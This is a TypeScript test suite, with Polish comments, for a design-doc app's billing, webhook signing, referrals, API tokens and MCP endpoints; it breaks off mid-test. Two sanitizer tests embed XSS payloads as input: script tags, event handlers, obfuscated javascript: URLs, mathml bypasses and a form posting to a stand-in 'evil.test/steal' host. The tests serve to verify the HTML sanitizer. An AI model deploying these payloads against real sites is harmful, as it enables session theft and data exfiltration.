import { createHmac } from 'node:crypto'
import { DateTime } from 'luxon'
import { test } from '@japa/runner'
import testUtils from '@adonisjs/core/services/test_utils'
import sharp from 'sharp'
import { billing, costs, freeCredits, polar, products } from '#config/billing'
import Board from '#models/board'
import CreditGrant from '#models/credit_grant'
import DesignDoc from '#models/design_doc'
import User from '#models/user'
import { MockProvider } from '#services/ai/mock_provider'
import { setProviderOverride } from '#services/ai/provider'
import {
  InsufficientCreditsError,
  balanceOf,
  ensureAutomaticGrants,
  grantCredits,
  releaseAll,
  reserveCredits,
} from '#services/billing/credits'
import { planFor } from '#services/billing/plans'
import { attachReferrer, referralCodeFor, rewardReferral } from '#services/billing/referrals'
import { isDisposableEmail } from '#services/disposable_email'
import { sanitizePreviewHtml } from '#services/design/preview_template'
import DesignPreview from '#models/design_preview'
import ApiToken from '#models/api_token'
import { createApiToken } from '#services/api_tokens'
import mail from '@adonisjs/mail/services/main'
import Asset from '#models/asset'
import BoardMember from '#models/board_member'
import PortalFeedback from '#models/portal_feedback'
import { pruneOrphanAssets } from '#services/assets_service'
import { safeFetchTesting } from '#services/safe_fetch'
import http from 'node:http'
import { runPendingJobs } from '#services/queue'

/**
 * Rozliczenia: kredyty, limity planów, naliczanie przy generacji i webhooki
 * Polar.sh (podpis Standard Webhooks, idempotencja, zwroty).
 */

/** Sekret w formacie Standard Webhooks (Polar od 2026-09-08): `whsec_` + base64. */
const SECRET = `whsec_${Buffer.from('polar-test-signing-key-0123456789').toString('base64')}`
const VARIANTS = { pack_s: 'prod-pack-s', pro: 'prod-pro' }

let seq = 0
async function makeUser(prefix = 'billing') {
  const suffix = `${Date.now()}-${++seq}-${Math.random().toString(36).slice(2, 6)}`
  return User.create({
    emailVerifiedAt: DateTime.utc(),
    email: `${prefix}-${suffix}@test.com`,
    password: 'password123',
  })
}

async function login(client: any, user: User) {
  const res = await client
    .post('/login')
    .json({ email: user.email, password: 'password123' })
    .redirects(0)
  return res.headers()['set-cookie']
}

async function createBoard(user: User, title = 'Kawiarnia') {
  const suffix = `${Date.now()}-${++seq}`
  return Board.create({ title, slug: `billing-${suffix}`, userId: user.id })
}

function png(color: { r: number; g: number; b: number }) {
  return sharp({ create: { width: 600, height: 400, channels: 3, background: color } })
    .png()
    .toBuffer()
}

/** Tablica z dwoma obrazami na płótnie. */
async function seedBoard(client: any, cookies: any, board: Board) {
  let req = client.post(`/api/boards/${board.id}/assets`).headers({ cookie: cookies })
  req = req.file('files', await png({ r: 240, g: 230, b: 210 }), {
    filename: 'home.png',
    contentType: 'image/png',
  })
  req = req.file('files', await png({ r: 20, g: 90, b: 110 }), {
    filename: 'detail.png',
    contentType: 'image/png',
  })
  const up = await req
  up.assertStatus(201)
  const ids = (up.body().data as { id: number }[]).map((a) => a.id)

  const scene = await client.get(`/api/boards/${board.id}/scene`).headers({ cookie: cookies })
  const elements = ids.map((id, i) => ({
    id: `i${i}`,
    type: 'image',
    assetId: String(id),
    x: i * 400,
    y: 0,
    width: 300,
    height: 200,
    rotation: 0,
    opacity: 1,
  }))
  const put = await client
    .put(`/api/boards/${board.id}/scene`)
    .headers({ cookie: cookies })
    .json({
      version: scene.body().data.version,
      document: { metadata: {}, elements },
      appState: {},
    })
  put.assertStatus(200)
  return ids
}

let webhookSeq = 0

/** Podpis Standard Webhooks: HMAC-SHA256(`id.timestamp.body`), klucz = base64 po `whsec_`. */
function sign(
  id: string,
  timestamp: number,
  body: string,
  key: Buffer = Buffer.from(SECRET.slice(6), 'base64')
) {
  return `v1,${createHmac('sha256', key).update(`${id}.${timestamp}.${body}`).digest('base64')}`
}

function webhook(
  client: any,
  payload: unknown,
  opts: { signature?: string; timestamp?: number; key?: Buffer } = {}
) {
  const body = JSON.stringify(payload)
  const id = `msg_${++webhookSeq}`
  const timestamp = opts.timestamp ?? Math.floor(Date.now() / 1000)
  return client
    .post('/webhooks/polar')
    .header('content-type', 'application/json')
    .header('webhook-id', id)
    .header('webhook-timestamp', String(timestamp))
    .header('webhook-signature', opts.signature ?? sign(id, timestamp, body, opts.key))
    .json(payload)
}

function orderPayload(
  user: User,
  orderId: string,
  productId: string,
  extra: Record<string, unknown> = {}
) {
  return {
    type: 'order.paid',
    timestamp: new Date().toISOString(),
    data: {
      id: orderId,
      status: 'paid',
      billing_reason: 'purchase',
      product_id: productId,
      subscription_id: null,
      customer_id: `cus-${user.id}`,
      customer: { id: `cus-${user.id}`, external_id: String(user.id), email: user.email },
      metadata: {},
      ...extra,
    },
  }
}

test.group('Billing', (group) => {
  const saved = {
    enforced: billing.enforced,
    secret: polar.webhookSecret,
    packS: products.pack_s.polarProductId,
    pro: products.pro.polarProductId,
  }

  group.each.setup(() => {
    billing.enforced = true
    polar.webhookSecret = SECRET
    products.pack_s.polarProductId = VARIANTS.pack_s
    products.pro.polarProductId = VARIANTS.pro
    setProviderOverride(new MockProvider())
    return testUtils.db().withGlobalTransaction()
  })
  group.each.teardown(() => {
    billing.enforced = saved.enforced
    polar.webhookSecret = saved.secret
    products.pack_s.polarProductId = saved.packS
    products.pro.polarProductId = saved.pro
    setProviderOverride(null)
  })

  test('darmowe kredyty: start + miesięczne, naliczane raz', async ({ assert }) => {
    const user = await makeUser()
    await ensureAutomaticGrants(user.id)
    await ensureAutomaticGrants(user.id)
    assert.equal(await balanceOf(user.id), freeCredits.signup + freeCredits.monthly)
    assert.equal(
      await CreditGrant.query()
        .where('user_id', user.id)
        .count('* as n')
        .then((r) => Number(r[0].$extras.n)),
      2
    )
  })

  test('rezerwacja zdejmuje najpierw pule wygasające najwcześniej; zwrot oddaje całość', async ({
    assert,
  }) => {
    const user = await makeUser()
    const late = await grantCredits(user.id, {
      source: 'admin',
      amount: 10,
      expiresAt: DateTime.utc().plus({ months: 6 }),
      externalId: `t-late-${user.id}`,
    })
    const soon = await grantCredits(user.id, {
      source: 'admin',
      amount: 5,
      expiresAt: DateTime.utc().plus({ days: 3 }),
      externalId: `t-soon-${user.id}`,
    })
    await grantCredits(user.id, {
      source: 'admin',
      amount: 50,
      expiresAt: DateTime.utc().minus({ days: 1 }),
      externalId: `t-expired-${user.id}`,
    })
    assert.equal(await balanceOf(user.id), 15, 'wygasła pula się nie liczy')

    const board = await createBoard(user)
    const doc = await DesignDoc.create({ boardId: board.id, version: 1, status: 'queued' })
    await reserveCredits(user.id, 8, { designDocId: doc.id })
    await soon!.refresh()
    await late!.refresh()
    assert.equal(soon!.remaining, 0)
    assert.equal(late!.remaining, 7)

    await assert.rejects(
      () => reserveCredits(user.id, 100, { designDocId: doc.id }),
      InsufficientCreditsError as any
    )
    assert.equal(await balanceOf(user.id), 7, 'nieudana rezerwacja nic nie zdejmuje')

    assert.equal(await releaseAll({ designDocId: doc.id }), 8)
    assert.equal(await balanceOf(user.id), 15)
    assert.equal(await releaseAll({ designDocId: doc.id }), 0, 'drugi zwrot nic nie oddaje')
  })

  test('generacja pobiera szacowany koszt; bez zmian — 0; plan Free dostaje stopkę', async ({
    client,
    assert,
  }) => {
    const user = await makeUser()
    const cookies = await login(client, user)
    const board = await createBoard(user)
    await seedBoard(client, cookies, board)

    const est = await client
      .get(`/api/boards/${board.id}/design-doc/estimate`)
      .headers({ cookie: cookies })
    est.assertStatus(200)
    const expected = 2 * costs.perMaterial + costs.compose
    assert.equal(est.body().data.credits, expected)
    assert.equal(est.body().data.newMaterials, 2)
    const startBalance = est.body().data.balance
    assert.equal(startBalance, freeCredits.signup + freeCredits.monthly)

    const post = await client
      .post(`/api/boards/${board.id}/design-doc`)
      .headers({ cookie: cookies })
      .json({})
    post.assertStatus(202)
    assert.equal(await balanceOf(user.id), startBalance - expected, 'rezerwacja przy zleceniu')

    await runPendingJobs()
    const doc = await DesignDoc.findOrFail(post.body().data.doc.id)
    assert.equal(doc.status, 'ready', doc.error ?? '')
    assert.equal(doc.creditsCharged, expected)
    assert.isNotNull(doc.spec)
    assert.include(doc.contentMd!, 'canvai.dev', 'stopka planu Free')

    // Bez zmian: ta sama wersja, zero kredytów.
    const again = await client
      .post(`/api/boards/${board.id}/design-doc`)
      .headers({ cookie: cookies })
      .json({})
    again.assertStatus(200)
    assert.isTrue(again.body().data.reused)
    assert.equal(await balanceOf(user.id), startBalance - expected)

    // Wymuszona generacja: analizy z cache — płaci tylko za złożenie.
    const est2 = await client
      .get(`/api/boards/${board.id}/design-doc/estimate`)
      .headers({ cookie: cookies })
    assert.isTrue(est2.body().data.unchanged)
    assert.equal(est2.body().data.credits, costs.compose)
  })

  test('za mało kredytów → 402 i nic nie powstaje; nieudana generacja zwraca kredyty', async ({
    client,
    assert,
  }) => {
    const user = await makeUser()
    const cookies = await login(client, user)
    const board = await createBoard(user)
    await seedBoard(client, cookies, board)

    // Wyczerpanie salda.
    await ensureAutomaticGrants(user.id)
    await CreditGrant.query().where('user_id', user.id).update({ remaining: 1 })
    const post = await client
      .post(`/api/boards/${board.id}/design-doc`)
      .headers({ cookie: cookies })
      .json({})
    post.assertStatus(402)
    assert.equal(post.body().code, 'E_INSUFFICIENT_CREDITS')
    assert.equal(
      await DesignDoc.query()
        .where('board_id', board.id)
        .count('* as n')
        .then((r) => Number(r[0].$extras.n)),
      0
    )

    // Doładowanie i generacja, która się nie powiedzie → pełny zwrot.
    await grantCredits(user.id, {
      source: 'admin',
      amount: 50,
      expiresAt: null,
      externalId: `t-topup-${user.id}`,
    })
    const before = await balanceOf(user.id)
    const failing = new MockProvider()
    failing.composeDocument = async () => {
      const { AiProviderError } = await import('#services/ai/types')
      throw new AiProviderError('boom', false)
    }
    setProviderOverride(failing)
    const ok = await client
      .post(`/api/boards/${board.id}/design-doc`)
      .headers({ cookie: cookies })
      .json({})
    ok.assertStatus(202)
    assert.isBelow(await balanceOf(user.id), before)
    await runPendingJobs()
    const doc = await DesignDoc.findOrFail(ok.body().data.doc.id)
    assert.equal(doc.status, 'failed')
    assert.equal(await balanceOf(user.id), before, 'kredyty wróciły')
  })

  test('plan Free: 1 tablica, bez Pro reasoning i eksportów', async ({ client, assert }) => {
    const user = await makeUser()
    const cookies = await login(client, user)
    const board = await createBoard(user)

    const second = await client
      .post('/boards')
      .headers({ cookie: cookies })
      .form({ title: 'Druga' })
      .redirects(0)
    second.assertStatus(302)
    assert.equal(second.header('location'), '/billing')
    assert.equal(
      await Board.query()
        .where('user_id', user.id)
        .count('* as n')
        .then((r) => Number(r[0].$extras.n)),
      1
    )

    const pro = await client
      .post(`/api/boards/${board.id}/design-doc`)
      .headers({ cookie: cookies })
      .json({ proMode: true })
    pro.assertStatus(403)

    const exp = await client
      .get(`/api/boards/${board.id}/design-doc/export?format=css`)
      .headers({ cookie: cookies })
    exp.assertStatus(403)
  })

  test('webhook: zły podpis / stary znacznik czasu → 403; zakup pakietu nalicza raz i daje PAYG', async ({
    client,
    assert,
  }) => {
    const user = await makeUser()
    const payload = orderPayload(user, 'ord-1', VARIANTS.pack_s)

    ;(await webhook(client, payload, { signature: 'v1,ZGVhZGJlZWY=' })).assertStatus(403)
    ;(
      await webhook(client, payload, { timestamp: Math.floor(Date.now() / 1000) - 600 })
    ).assertStatus(403)
    assert.equal(await planFor(user.id), 'free')

    const ok = await webhook(client, payload)
    ok.assertStatus(202)
    const replay = await webhook(client, payload)
    replay.assertStatus(202)

    const packs = await CreditGrant.query().where('user_id', user.id).where('source', 'pack')
    assert.lengthOf(packs, 1, 'powtórzony webhook nie nalicza drugi raz')
    assert.equal(packs[0].amount, products.pack_s.credits)
    assert.equal(await planFor(user.id), 'payg')

    // Zwrot płatności cofa niewykorzystane kredyty i plan.
    const refund = await webhook(client, {
      type: 'order.refunded',
      data: { ...payload.data, status: 'refunded' },
    })
    refund.assertStatus(202)
    await packs[0].refresh()
    assert.equal(packs[0].remaining, 0)
    assert.equal(await planFor(user.id), 'free')
  })

  test('webhook: subskrypcja Pro → plan pro, kredyty za każde opłacone zamówienie', async ({
    client,
    assert,
  }) => {
    const user = await makeUser()
    const customer = { id: `cus-${user.id}`, external_id: String(user.id), email: user.email }
    const sub = {
      id: 'sub-9',
      status: 'active',
      product_id: VARIANTS.pro,
      customer_id: customer.id,
      customer,
      current_period_end: DateTime.utc().plus({ months: 1 }).toISO(),
      cancel_at_period_end: false,
      ends_at: null,
      ended_at: null,
      metadata: {},
    }
    ;(await webhook(client, { type: 'subscription.created', data: sub })).assertStatus(202)
    assert.equal(await planFor(user.id), 'pro')

    const orders: [string, string][] = [
      ['ord-s1', 'subscription_create'],
      ['ord-s1', 'subscription_create'],
      ['ord-s2', 'subscription_cycle'],
      ['ord-s3', 'subscription_update'],
    ]
    for (const [id, reason] of orders) {
      ;(
        await webhook(
          client,
          orderPayload(user, id, VARIANTS.pro, { billing_reason: reason, subscription_id: 'sub-9' })
        )
      ).assertStatus(202)
    }
    const grants = await CreditGrant.query()
      .where('user_id', user.id)
      .where('source', 'subscription')
    assert.lengthOf(grants, 2, 'create + cycle; powtórka i proracja bez kredytów')
    assert.equal(grants[0].amount, products.pro.credits)

    // Anulowana na koniec okresu — dostęp do końca opłaconego okresu.
    ;(
      await webhook(client, {
        type: 'subscription.canceled',
        data: { ...sub, cancel_at_period_end: true },
      })
    ).assertStatus(202)
    assert.equal(await planFor(user.id), 'pro')

    // Odebrana (koniec okresu) → z powrotem Free.
    ;(
      await webhook(client, {
        type: 'subscription.revoked',
        data: {
          ...sub,
          status: 'canceled',
          ended_at: DateTime.utc().minus({ minutes: 1 }).toISO(),
        },
      })
    ).assertStatus(202)
    assert.equal(await planFor(user.id), 'free')
  })

  test('webhook: sekret sprzed 2026-09-08 (klucz = bajty UTF-8 całego whsec_…) też działa', async ({
    client,
    assert,
  }) => {
    const user = await makeUser()
    const legacy = await webhook(client, orderPayload(user, 'ord-legacy', VARIANTS.pack_s), {
      key: Buffer.from(SECRET, 'utf8'),
    })
    legacy.assertStatus(202)
    assert.equal(await planFor(user.id), 'payg')
  })

  test('plan płatny: eksporty tokenów, bez stopki, pełna historia wersji', async ({
    client,
    assert,
  }) => {
    const user = await makeUser()
    const cookies = await login(client, user)
    ;(await webhook(client, orderPayload(user, 'ord-exp', VARIANTS.pack_s))).assertStatus(202)
    const board = await createBoard(user)
    await seedBoard(client, cookies, board)

    for (let i = 0; i < 3; i++) {
      ;(
        await client
          .post(`/api/boards/${board.id}/design-doc`)
          .headers({ cookie: cookies })
          .json({ force: true })
      ).assertStatus(202)
      await runPendingJobs()
    }
    const doc = await DesignDoc.query()
      .where('board_id', board.id)
      .orderBy('version', 'desc')
      .firstOrFail()
    assert.equal(doc.status, 'ready', doc.error ?? '')
    assert.notInclude(doc.contentMd!, 'canvai (', 'bez stopki w planie płatnym')

    const list = await client
      .get(`/api/boards/${board.id}/design-docs`)
      .headers({ cookie: cookies })
    assert.lengthOf(list.body().data, 3)

    const css = await client
      .get(`/api/boards/${board.id}/design-doc/export?format=css`)
      .headers({ cookie: cookies })
    css.assertStatus(200)
    assert.include(css.text(), ':root {')
    const tw = await client
      .get(`/api/boards/${board.id}/design-doc/export?format=tailwind`)
      .headers({ cookie: cookies })
    assert.include(tw.text(), '@theme {')
    const tokens = await client
      .get(`/api/boards/${board.id}/design-doc/export?format=tokens`)
      .headers({ cookie: cookies })
    tokens.assertStatus(200)
    const json = JSON.parse(tokens.text())
    const firstColor = Object.values(json.color)[0] as { $type: string; $value: string }
    assert.equal(firstColor.$type, 'color')
    assert.match(firstColor.$value, /^#[0-9a-f]{6}$/i)
  })

  test('plan Free widzi tylko 2 ostatnie wersje', async ({ client, assert }) => {
    const user = await makeUser()
    const cookies = await login(client, user)
    const board = await createBoard(user)
    for (let v = 1; v <= 3; v++) {
      await DesignDoc.create({
        boardId: board.id,
        version: v,
        status: 'ready',
        contentMd: `# v${v}`,
      })
    }
    const list = await client
      .get(`/api/boards/${board.id}/design-docs`)
      .headers({ cookie: cookies })
    assert.deepEqual(
      list.body().data.map((d: { version: number }) => d.version),
      [3, 2]
    )
    assert.equal(list.body().meta.hiddenVersions, 1)
    const old = await client
      .get(`/api/boards/${board.id}/design-doc?version=1`)
      .headers({ cookie: cookies })
    old.assertStatus(403)
  })

  test('rejestracja z jednorazowej skrzynki jest blokowana', async ({ client, assert }) => {
    assert.isTrue(isDisposableEmail('x@mailinator.com'))
    assert.isTrue(isDisposableEmail('x@abc.mailinator.com'))
    assert.isFalse(isDisposableEmail('x@gmail.com'))

    const email = `temp-${Date.now()}@yopmail.com`
    const res = await client
      .post('/signup')
      .header('accept', 'application/json')
      .json({ fullName: null, email, password: 'password123', passwordConfirmation: 'password123' })
    res.assertStatus(422)
    assert.equal(res.body().errors[0].field, 'email')
    assert.equal(res.body().errors[0].rule, 'disposable')
    assert.isNull(await User.findBy('email', email))
  })

  test('polecenie: link zapisuje polecającego, nagroda po potwierdzeniu e-maila — raz', async ({
    client,
    assert,
  }) => {
    const referrer = await makeUser('referrer')
    const code = await referralCodeFor(referrer)
    assert.match(code, /^[a-z0-9]{8}$/)
    assert.equal(await referralCodeFor(referrer), code, 'kod jest stały')

    // HTTP: /signup?ref= ustawia cookie, rejestracja zapisuje polecającego.
    const page = await client.get(`/signup?ref=${code}`)
    const refCookie = ([] as string[])
      .concat(page.headers()['set-cookie'] ?? [])
      .find((c) => c.startsWith('dc_ref='))
    assert.exists(refCookie)
    const email = `invited-${Date.now()}@test.com`
    const res = await client
      .post('/signup')
      .header('cookie', refCookie!.split(';')[0])
      .json({ fullName: null, email, password: 'password123', passwordConfirmation: 'password123' })
      .redirects(0)
    assert.equal(res.header('location'), '/verify-email')
    const invited = await User.findByOrFail('email', email)
    assert.equal(invited.referredById, referrer.id)

    // Bez potwierdzonego e-maila nie ma nagrody.
    assert.isFalse(await rewardReferral(invited))
    invited.emailVerifiedAt = DateTime.utc()
    await invited.save()
    assert.isTrue(await rewardReferral(invited))
    assert.isFalse(await rewardReferral(invited), 'drugi raz nic')

    const bonus = (userId: number) =>
      CreditGrant.query().where('user_id', userId).where('source', 'referral')
    assert.lengthOf(await bonus(invited.id), 1)
    assert.lengthOf(await bonus(referrer.id), 1)

    // Samego siebie polecić się nie da.
    const self = await makeUser('self')
    await attachReferrer(self, await referralCodeFor(self))
    assert.notExists(self.referredById)
  })

  test('podgląd UI: kosztuje kredyty, serwowany w piaskownicy, błąd = zwrot', async ({
    client,
    assert,
  }) => {
    const user = await makeUser()
    const cookies = await login(client, user)
    const board = await createBoard(user)
    await seedBoard(client, cookies, board)

    // Bez gotowego dokumentu nie ma podglądu.
    const early = await client
      .post(`/api/boards/${board.id}/design-doc/preview`)
      .headers({ cookie: cookies })
      .json({})
    early.assertStatus(422)

    ;(
      await client.post(`/api/boards/${board.id}/design-doc`).headers({ cookie: cookies }).json({})
    ).assertStatus(202)
    await runPendingJobs()
    const before = await balanceOf(user.id)

    const post = await client
      .post(`/api/boards/${board.id}/design-doc/preview`)
      .headers({ cookie: cookies })
      .json({})
    post.assertStatus(202)
    assert.equal(await balanceOf(user.id), before - costs.preview)
    await runPendingJobs()

    const show = await client
      .get(`/api/boards/${board.id}/design-doc/preview?version=1`)
      .headers({ cookie: cookies })
    const dto = show.body().data
    assert.equal(dto.status, 'ready', dto.error)
    assert.equal(dto.creditsCharged, costs.preview)

    const html = await client.get(dto.url).headers({ cookie: cookies })
    html.assertStatus(200)
    assert.include(html.text(), '<!doctype html>')
    assert.notInclude(html.text(), '<script')
    const csp = html.header('content-security-policy')
    assert.include(csp, 'sandbox')
    assert.include(csp, "default-src 'none'")

    // Gotowy podgląd bez `force` — bez opłaty.
    const again = await client
      .post(`/api/boards/${board.id}/design-doc/preview`)
      .headers({ cookie: cookies })
      .json({})
    again.assertStatus(200)
    assert.equal(await balanceOf(user.id), before - costs.preview)

    // Obcy nie zobaczy HTML.
    const stranger = await makeUser('stranger')
    const strangerCookies = await login(client, stranger)
    ;(await client.get(dto.url).headers({ cookie: strangerCookies })).assertStatus(404)

    // Błąd modelu → zwrot kredytów.
    const failing = new MockProvider()
    failing.composePreview = async () => {
      const { AiProviderError } = await import('#services/ai/types')
      throw new AiProviderError('boom', false)
    }
    setProviderOverride(failing)
    const mid = await balanceOf(user.id)
    ;(
      await client
        .post(`/api/boards/${board.id}/design-doc/preview`)
        .headers({ cookie: cookies })
        .json({ force: true })
    ).assertStatus(202)
    await runPendingJobs()
    const failed = await DesignPreview.query().orderBy('id', 'desc').firstOrFail()
    assert.equal(failed.status, 'failed')
    assert.equal(await balanceOf(user.id), mid)
  })

  test('sanitizePreviewHtml usuwa skrypty, handlery i obce zasoby', ({ assert }) => {
    const dirty = `<html><head><script>alert(1)</script><link rel="stylesheet" href="https://evil.test/x.css">
      <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Inter"><meta http-equiv="refresh" content="0;url=https://evil.test"></head>
      <body onload="steal()"><a href="javascript:alert(1)">x</a><iframe src="https://evil.test"></iframe><img src=x onerror=alert(1)></body></html>`
    const clean = sanitizePreviewHtml(dirty)
    assert.notInclude(clean, '<script')
    assert.notInclude(clean, 'evil.test')
    assert.notInclude(clean, 'onload')
    assert.notInclude(clean, 'onerror')
    assert.notInclude(clean, 'javascript:')
    assert.include(clean, 'fonts.googleapis.com')
  })

  test('sanitizePreviewHtml (SEC-11): wektory obejścia regexów i meta CSP', ({ assert }) => {
    const dirty = `<!doctype html><html><head><title>T</title>
      <link rel="stylesheet" href="https://fonts.googleapis.com.evil.test/css">
      <link rel="stylesheet" href="//evil.test/?fonts.googleapis.com">
      <link rel="preload" href="https://fonts.googleapis.com/css2?family=Inter">
      <style>@import url("https://evil.test/a.css"); @import "https://fonts.googleapis.com/css2?family=Inter";
      body{background:url(https://evil.test/track.png);color:#111} .x{background:url("data:image/png;base64,AAAA")}</style>
      </head><body>
      <svg/onload=alert(1)><circle cx="5" cy="5" r="4" fill="#f00"/></svg>
      <a href=javascript:alert(1)>a</a>
      <a href="&#106;avascript:alert(1)">b</a>
      <a href="JaVaScRiPt&colon;alert(1)">c</a>
      <img src="https://evil.test/p.png" alt="x"><img src="data:image/png;base64,AAAA" alt="ok">
      <div style="background-image:url(https://evil.test/s.png);padding:8px">d</div>
      <form action="https://evil.test/steal"><input name="q" onfocus="x()"><button formaction="https://evil.test">s</button></form>
      <math><mtext><style><img src=x onerror=alert(1)></style></mtext></math>
      </body></html>`
    const clean = sanitizePreviewHtml(dirty)
    assert.notInclude(clean, 'evil.test')
    assert.notMatch(clean, /javascript/i)
    assert.notMatch(clean, /\sonload|\sonerror|\sonfocus/i)
    assert.notInclude(clean, 'action=')
    assert.include(clean, '<circle')
    assert.include(clean, 'data:image/png;base64,AAAA')
    assert.include(clean, '@import "https://fonts.googleapis.com/css2?family=Inter"')
    assert.include(clean, 'padding:8px')
    assert.match(clean, /^<!doctype html>/)
    assert.include(clean, `<meta http-equiv="Content-Security-Policy" content="default-src 'none'`)
    assert.notInclude(clean, 'rel="preload"')
  })

  test('API v1 i MCP: token Bearer, płatny plan, DESIGN.md i tokeny', async ({
    client,
    assert,
  }) => {
    const user = await makeUser()
    const cookies = await login(client, user)
    const board = await createBoard(user, 'Studio Mono')
    await seedBoard(client, cookies, board)
    ;(
      await client.post(`/api/boards/${board.id}/design-doc`).headers({ cookie: cookies }).json({})
    ).assertStatus(202)
    await runPendingJobs()

    const { token } = await createApiToken(user, 'test')
    const auth = { authorization: `Bearer ${token}` }

    // Bez tokenu / zły token → 401; plan Free → 403.
    ;(await client.get('/api/v1/boards')).assertStatus(401)
    ;(
      await client
        .get('/api/v1/boards')
        .headers({ authorization: 'Bearer cvai_nope_nope_nope_nope' })
    ).assertStatus(401)
    ;(await client.get('/api/v1/boards').headers(auth)).assertStatus(403)

    // Zakup pakietu → dostęp.
    ;(
      await webhook(client, orderPayload(user, `ord-api-${user.id}`, VARIANTS.pack_s))
    ).assertStatus(202)

    const boards = await client.get('/api/v1/boards').headers(auth)
    boards.assertStatus(200)
    assert.equal(boards.body().data[0].title, 'Studio Mono')
    assert.equal(boards.body().data[0].designMd.version, 1)

    const md = await client.get(`/api/v1/boards/${board.id}/design-md`).headers(auth)
    md.assertStatus(200)
    assert.include(md.text(), 'Style Reference')
    const css = await client.get(`/api/v1/boards/${board.id}/tokens?format=css`).headers(auth)
    assert.include(css.text(), ':root {')

    // Cudza tablica niewidoczna.
    const other = await makeUser('other')
    const otherBoard = await createBoard(other)
    ;(await client.get(`/api/v1/boards/${otherBoard.id}/design-md`).headers(auth)).assertStatus(404)

    // MCP
    const rpc = (body: unknown) =>
      client
        .post('/mcp')
        .headers({ ...auth, accept: 'application/json, text/event-stream' })
        .json(body)

    const init = await rpc({
      jsonrpc: '2.0',
      id: 1,
      method: 'initialize',
      params: {
        protocolVersion: '2025-06-18',
        capabilities: {},
        clientInfo: { name: 't', version: '1' },
      },
    })
    init.assertStatus(200)
    assert.equal(init.body().result.protocolVersion, '2025-06-18')
    assert.equal(init.body().result.serverInfo.name, 'canvai')

    ;(await rpc({ jsonrpc: '2.0', method: 'notifications/initialized' })).assertStatus(202)

    const tools = await rpc({ jsonrpc: '2.0', id: 2, method: 'tools/list' })
    assert.sameMembers(
      tools.body().result.tools.map((tl: { name: string }) => tl.name),
      ['list_boards', 'get_design_md', 'get_design_tokens']
    )

    const call = await rpc({
      jsonrpc: '2.0',
      id: 3,
      method: 'tools/call',
      params: { name: 'get_design_md', arguments: { board_id: board.id } },
    })
    assert.include(call.body().result.content[0].text, 'Style Reference')

    const tw = await rpc({
      jsonrpc: '2.0',
      id: 4,
      method: 'tools/call',
      params: { name: 'get_design_tokens', arguments: { board_id: board.id, format: 'tailwind' } },
    })
    assert.include(tw.body().result.content[0].text, '@theme {')

    const missing = await rpc({
      jsonrpc: '2.0',
      id: 5,
      method: 'tools/call',
      params: { name: 'get_design_md', arguments: { board_id: otherBoard.id } },
    })
    assert.isTrue(missing.body().result.isError)

    const res = await rpc({ jsonrpc: '2.0', id: 6, method: 'resources/list' })
    const uri = res.body().result.resources[0].uri
    assert.equal(uri, `canvai://boards/${board.id}/design-md`)
    const read = await rpc({ jsonrpc: '2.0', id: 7, method: 'resources/read', params: { uri } })
    assert.equal(read.body().result.contents[0].mimeType, 'text/markdown')

    const unknown = await rpc({ jsonrpc: '2.0', id: 8, method: 'nope' })
    assert.equal(unknown.body().error.code, -32601)
    ;(await client.get('/mcp')).assertStatus(405)

    // Odwołany token przestaje działać.
    await ApiToken.query().where('user_id', user.id).update({ revoked_at: DateTime.utc().toSQL() })
    ;(await client.get('/api/v1/boards').headers(auth)).assertStatus(401)
  })

  test('API v1 i MCP: limit historii planu właściciela, batch ograniczony (SEC-12)', async ({
    client,
    assert,
  }) => {
    // Właściciel na planie Free (2 ostatnie wersje), członek z płatnym planem i tokenem API.
    const owner = await makeUser('owner')
    const board = await createBoard(owner, 'Wspólna')
    for (let v = 1; v <= 3; v++) {
      await DesignDoc.create({
        boardId: board.id,
        version: v,
        status: 'ready',
        contentMd: `# v${v}`,
      })
    }
    const member = await makeUser('member')
    await BoardMember.create({
      boardId: board.id,
      userId: member.id,
      email: member.email,
      role: 'viewer',
      token: `t${member.id}${Date.now()}`,
      acceptedAt: DateTime.utc(),
    })
    ;(
      await webhook(client, orderPayload(member, `ord-sec12-${member.id}`, VARIANTS.pack_s))
    ).assertStatus(202)
    const { token } = await createApiToken(member, 'test')
    const auth = { authorization: `Bearer ${token}` }

    const v3 = await client.get(`/api/v1/boards/${board.id}/design-md`).headers(auth)
    v3.assertStatus(200)
    assert.include(v3.text(), '# v3')
    ;(
      await client.get(`/api/v1/boards/${board.id}/design-md?version=1`).headers(auth)
    ).assertStatus(404)

    const rpc = (body: unknown) =>
      client
        .post('/mcp')
        .headers({ ...auth, accept: 'application/json, text/event-stream' })
        .json(body)
    const hidden = await rpc({
      jsonrpc: '2.0',
      id: 1,
      method: 'tools/call',
      params: { name: 'get_design_md', arguments: { board_id: board.id, version: 1 } },
    })
    assert.isTrue(hidden.body().result.isError)

    const call = (id: number) => ({ jsonrpc: '2.0', id, method: 'tools/list' })
    const ok = await rpc(Array.from({ length: 20 }, (_, i) => call(i + 1)))
    ok.assertStatus(200)
    assert.lengthOf(ok.body(), 20)
    assert.deepEqual(
      ok.body().map((r: { id: number }) => r.id),
      Array.from({ length: 20 }, (_, i) => i + 1)
    )
    ;(await rpc(Array.from({ length: 21 }, (_, i) => call(i + 1)))).assertStatus(400)
  })

  test('ustawienia: utworzenie i odwołanie tokenu API', async ({ client, assert }) => {
    const user = await makeUser()
    const cookies = await login(client, user)
    const created = await client
      .post('/settings/api-tokens')
      .headers({ cookie: cookies })
      .form({ name: 'Laptop' })
      .redirects(0)
    created.assertStatus(302)
    const row = await ApiToken.query().where('user_id', user.id).firstOrFail()
    assert.equal(row.name, 'Laptop')
    assert.match(row.prefix, /^cvai_/)
    assert.lengthOf(row.tokenHash, 64)

    await client.delete(`/settings/api-tokens/${row.id}`).headers({ cookie: cookies }).redirects(0)
    await row.refresh()
    assert.isNotNull(row.revokedAt)
  })

  test('portal klienta: link, przesyłanie do skrzynki, akceptacja, odwołanie', async ({
    client,
    assert,
  }) => {
    const fake = mail.fake()
    try {
      const owner = await makeUser('owner')
      const cookies = await login(client, owner)
      const board = await createBoard(owner, 'Portal Test')

      // Free → portal zablokowany.
      ;(
        await client
          .put(`/api/boards/${board.id}/share`)
          .headers({ cookie: cookies })
          .json({ enabled: true })
      ).assertStatus(403)

      ;(
        await webhook(client, orderPayload(owner, `ord-portal-${owner.id}`, VARIANTS.pack_s))
      ).assertStatus(202)
      const on = await client
        .put(`/api/boards/${board.id}/share`)
        .headers({ cookie: cookies })
        .json({ enabled: true })
      on.assertStatus(200)
      const url: string = on.body().data.url
      const path = new URL(url).pathname
      assert.match(path, /^\/c\/[A-Za-z0-9_-]{20,}$/)

